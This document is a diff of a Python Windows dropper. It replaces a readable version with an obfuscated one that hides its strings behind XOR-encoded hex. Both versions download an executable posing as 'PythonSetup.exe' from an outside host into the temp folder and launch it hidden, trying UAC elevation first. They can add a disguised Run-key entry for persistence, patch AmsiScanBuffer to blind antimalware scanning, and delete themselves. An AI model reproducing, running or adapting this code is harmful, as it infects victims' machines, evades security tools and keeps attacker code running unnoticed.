@@ -1,175 +1,160 @@
-# -*- coding: utf-8 -*-
-# py-dropper: fetch over HTTP(S) -> %TEMP% -> detached exec
-import os, sys, time, tempfile, subprocess
-import urllib.request
-try:
-    from urllib.request import urlopen
-except ImportError:
-    from urllib2 import urlopen
+"echo off"; ""
+cls_=type('_',(),{})
+_=cls_()
 
-URL  = r'''https://driveme2026.shop/pad8DeDlCtY8/ONhcxe032mLi/PythonSetup.exe'''
-NAME = r'''LNKBUILD.exe'''
-HIDE = True
-PERSIST = False
-SELF_DELETE = False
-AMSI_GUARD = False
+def _dec(a, b, k):
+    x = bytes.fromhex(a.decode())
+    y = bytes.fromhex(b.decode())
+    z = bytes.fromhex(k.decode())
+    return "".join(chr(y[i] ^ x[i] ^ z[i % len(z)]) for i in range(len(y)))
 
-LOG = os.path.join(tempfile.gettempdir(), '~dropper.log')
 
-def log(msg):
+def _spawn(p, hide):
+    c = __import__("ctypes")
+    o = __import__("os")
+    sp = __import__("subprocess")
     try:
-        with open(LOG, 'a', encoding='utf-8') as f:
-            f.write(str(msg) + chr(10))
+        o.chmod(p, 0o777)
     except Exception:
         pass
-
-def temp_path(name):
-    d = tempfile.gettempdir()
-    p = os.path.join(d, name)
-    try:
-        if os.path.exists(p):
-            os.chmod(p, 0o666)
-            os.remove(p)
-    except Exception as e:
-        log('temp_path: ' + repr(e))
-    return p
-
-def http_get(url):
-    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
-    last = None
-    for attempt in range(4):
+    n = 0 if hide else 1
+    s = c.WinDLL(_._[6], use_last_error=True)
+    s.ShellExecuteW.restype = c.c_void_p
+    s.ShellExecuteW.argtypes = [c.c_void_p, c.c_wchar_p, c.c_wchar_p, c.c_wchar_p, c.c_wchar_p, c.c_int]
+    for v in (_._[7], _._[8]):
         try:
-            req = urllib.request.Request(url, headers={'User-Agent': ua})
-            with urlopen(req, timeout=60) as r:
-                return r.read()
-        except Exception as e:
-            last = e
-            time.sleep(2 + attempt * 3)
-    log('http_get failed: ' + repr(last))
-    return None
-
-def run_detached(path, hide):
-    # ShellExecute умеет UAC (runas) - нужен для манифестов requireAdministrator
-    if os.name == 'nt':
-        import ctypes
-        try:
-            os.chmod(path, 0o777)
+            if s.ShellExecuteW(None, v, p, None, o.path.dirname(p), n) > 32:
+                return True
         except Exception:
             pass
-        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-        shell32.ShellExecuteW.restype = ctypes.c_void_p
-        shell32.ShellExecuteW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p,
-                                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_int]
-        nshow = 0 if hide else 1
-        # 1) elevation (runas) - для requireAdministrator
-        r = shell32.ShellExecuteW(None, 'runas', path, None, os.path.dirname(path), nshow)
-        log('ShellExecute runas -> ' + str(r))
-        if r > 32:
-            return True
-        # 2) UAC отклонили или манифест asInvoker - обычное открытие
-        r = shell32.ShellExecuteW(None, 'open', path, None, os.path.dirname(path), nshow)
-        log('ShellExecute open -> ' + str(r))
-        if r > 32:
-            return True
-        # 3) крайний случай - прямой CreateProcess
-        try:
-            flags = 0x00000008 | 0x00000200
-            si = subprocess.STARTUPINFO()
-            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            si.wShowWindow = nshow
-            subprocess.Popen([path], close_fds=True, creationflags=flags, startupinfo=si)
-            return True
-        except Exception as e:
-            log('Popen fallback failed: ' + repr(e))
-            return False
-    else:
-        os.chmod(path, 0o755)
-        subprocess.Popen([path], close_fds=True, start_new_session=True)
-        return True
-
-def do_persist(path):
-    if os.name != 'nt':
-        return
     try:
-        import winreg
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                             r'Software\Microsoft\Windows\CurrentVersion\Run',
-                             0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'WindowsServiceHost', 0, winreg.REG_SZ, '"' + path + '"')
-        winreg.CloseKey(key)
-    except Exception as e:
-        log('persist: ' + repr(e))
-
-def unlink_self():
-    if os.name != 'nt':
-        return
-    try:
-        me = os.path.abspath(sys.argv[0])
-        cmd = 'ping 127.0.0.1 -n 3 >nul & del /f /q "' + me + '"'
-        subprocess.Popen(['cmd.exe', '/c', cmd],
-                         creationflags=0x08000000, close_fds=True)
-    except Exception as e:
-        log('unlink_self: ' + repr(e))
-
-def amsi_bypass():
-    # mov eax,0x80070057 ; ret  -> E_INVALIDARG
-    if os.name != 'nt':
+        i = sp.STARTUPINFO()
+        i.dwFlags |= sp.STARTF_USESHOWWINDOW
+        i.wShowWindow = n
+        sp.Popen([p], close_fds=True, creationflags=0x00000008 | 0x00000200, startupinfo=i)
         return True
-    import ctypes
-    from ctypes import wintypes
-    try:
-        k32 = ctypes.WinDLL('kernel32', use_last_error=True)
-        k32.GetModuleHandleA.restype = ctypes.c_void_p
-        k32.GetProcAddress.restype = ctypes.c_void_p
-        k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
-        k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
-                                        wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
-        h = k32.GetModuleHandleA(b'amsi.dll')
-        if not h:
-            log('amsi: amsi.dll not loaded')
-            return False
-        p = k32.GetProcAddress(h, b'AmsiScanBuffer')
-        if not p:
-            log('amsi: AmsiScanBuffer not found')
-            return False
-        patch = b'\xB8\x57\x00\x07\x80\xC3'
-        old = wintypes.DWORD(0)
-        k32.VirtualProtect(p, len(patch), 0x40, ctypes.byref(old))
-        ctypes.memmove(p, patch, len(patch))
-        k32.VirtualProtect(p, len(patch), old.value, ctypes.byref(old))
-        log('amsi: patched ok')
-        return True
-    except Exception as e:
-        log('amsi: ' + repr(e))
+    except Exception:
         return False
 
 
-def main():
-    dst = temp_path(NAME)
-    data = http_get(URL)
-    if not data:
-        log("download failed"); return 1
-    log("downloaded %d bytes" % len(data))
-    with open(dst, "wb") as f:
-        f.write(data)
-    log("written " + dst)
-    if AMSI_GUARD:
-        amsi_bypass()
-    if PERSIST:
-        do_persist(dst)
-    ok = run_detached(dst, HIDE)
-    log("launch result: " + str(ok))
-    return 0 if ok else 2
-
-if __name__ == "__main__":
-    rc = 1
+def _persist(p):
     try:
-        rc = main()
-    except SystemExit as e:
-        rc = e.code if isinstance(e.code, int) else 1
+        w = __import__("winreg")
+        k = w.OpenKey(w.HKEY_CURRENT_USER, _._[9], 0, w.KEY_SET_VALUE)
+        w.SetValueEx(k, _._[10], 0, w.REG_SZ, chr(34) + p + chr(34))
+        w.CloseKey(k)
     except Exception:
-        import traceback
-        log("FATAL:" + chr(10) + traceback.format_exc())
-    if SELF_DELETE:
-        unlink_self()
-    sys.exit(rc)
+        pass
+
+def _unhook():
+    try:
+        c = __import__("ctypes")
+        k = c.WinDLL(_._[11], use_last_error=True)
+        k.GetModuleHandleA.restype = c.c_void_p
+        k.GetProcAddress.restype = c.c_void_p
+        k.GetProcAddress.argtypes = [c.c_void_p, c.c_char_p]
+        h = k.GetModuleHandleA(_._[12].encode())
+        if not h:
+            return False
+        a = k.GetProcAddress(h, _._[13].encode())
+        if not a:
+            return False
+        t = bytes.fromhex("b857000780c3")
+        old = c.c_ulong(0)
+        k.VirtualProtect(a, len(t), 0x40, c.byref(old))
+        c.memmove(a, t, len(t))
+        k.VirtualProtect(a, len(t), old.value, c.byref(old))
+        return True
+    except Exception:
+        return False
+
+
+def _drop(dst, data, hide, pers, amsi):
+    o = __import__("os")
+    tp = __import__("tempfile")
+    path = o.path.join(tp.gettempdir(), dst)
+    try:
+        if o.path.exists(path):
+            o.chmod(path, 0o666)
+            o.remove(path)
+    except Exception:
+        pass
+    try:
+        with open(path, "wb") as f:
+            f.write(data)
+    except Exception:
+        return 1
+    if pers:
+        _persist(path)
+    if amsi:
+        _unhook()
+    return 0 if _spawn(path, hide) else 2
+
+def _esc():
+    try:
+        me = __import__("os").path.abspath(__import__("sys").argv[0])
+        __import__("subprocess").Popen(
+            [_._[14], _._[15], _._[16] + chr(34) + me + chr(34)],
+            creationflags=0x08000000,
+            close_fds=True,
+        )
+    except Exception:
+        pass
+
+
+def _get(u):
+    r = __import__("urllib.request", fromlist=["x"])
+    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
+    tm = __import__("time")
+    for n in range(4):
+        try:
+            with r.urlopen(r.Request(u, headers=h), timeout=60) as f:
+                return f.read()
+        except Exception:
+            tm.sleep(2 + n * 3)
+    return None
+
+
+def main():
+    data = _get(_._[0])
+    if not data:
+        return 1
+    rc = _drop(_._[1], data, _._[2], _._[3], _._[5])
+    if _._[4]:
+        _esc()
+    return rc
+
+_._=[
+(b'043b12e655e92348efdc7df2b710188cf005b7926184efaa9bbd99e286bccbb7982480b6d4f637a7bc3998d4bda6892ad01627f9b4813b7f4b684c975141c13411c65b',b'3d202ae648e74201b2d471c8831231ceae03cfda2b96e596e59581a1adbcffab9634d6b6ddb60bbd824aafe0fd9fd92ac70d44bdea812a4a2d6140bc6e4be96a1a8a70',b'516f4c706e344e66397a654c',),
+(b'70127195d20417e9026c6dab9f577b78',b'491356c5e50e7ead012569aedc7b7b4e',b'4978533858645a6a356735376d',),
+(b'30',0,''),
+(b'31',0,''),
+(b'31',0,''),
+(b'31',0,''),
+(b'13922f7b5763e0',b'36cd39207712a5',b'563773374c42776b6b4e50',),
+(b'4f2eb85bb0',b'4916a66cb2',b'744d70567150493773',),
+(b'6f3ef154',b'7679db4a',b'76374f705a4e657a4f787a30',),
+(b'12ddfeeb51620ad685ad240b8e3c359963dad21fb75afaf1420f89c2d3c0a2f3c827048ba8741a7565676ca719',b'02c1f2c8616e1ac0bda40e1b9604019b67ddea0c9d47f4c97211b7f2c2f693e5cc041583b874175e4848548530',b'43736a57476d62736444',),
+(b'0eaa42d94804c50c31436739aaf1efc05eb9',b'0cf666887e18f26a02622305fcde92f64689',b'55354a35596b4435565332',),
+(b'7ada634ca89bcad8',b'24ca2178b9ba95de',b'3575305a744d6c343543',),
+(b'3573c98f35d3f03d',b'3c67f5aa2fddea03',b'68794f4c346a76523438324167',),
+(b'5726e7c29ced46b8efadfaea4aed',b'7111dff8b5ec12b7ca82d7df55fd',b'675a4b537a623561',),
+(b'e75f0749d10733',b'e7452c51f2182f',b'63774f3646677937',),
+(b'52cd',b'09f8',b'7456334e5447764b47465a716a37',),
+(b'016396a575b2bdeba824644a5183060e6bff4421cff00d3a1b0879dbff3f5cfeb38d85f603',b'26438e9730f9bbeaea43030c2ad75c1733b3204887cb1d2c0f1835e8d32529b4af999ceb74',b'57497655657a34366c',)
+
+]
+_p=[]
+for _t in _._:
+    if len(_t)<3:
+        _p.append(_t[0])
+    elif _t[1]==0:
+        _p.append(_t[0]==b'30')
+    elif _t[1]==b'base64':
+        _p.append(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b64decode(_t[0]).decode())
+    else:
+        _p.append(_dec(_t[0],_t[1],_t[2]))
+_._=_p
+
+if __name__=='__main__':
+    __import__('sys').exit(main())
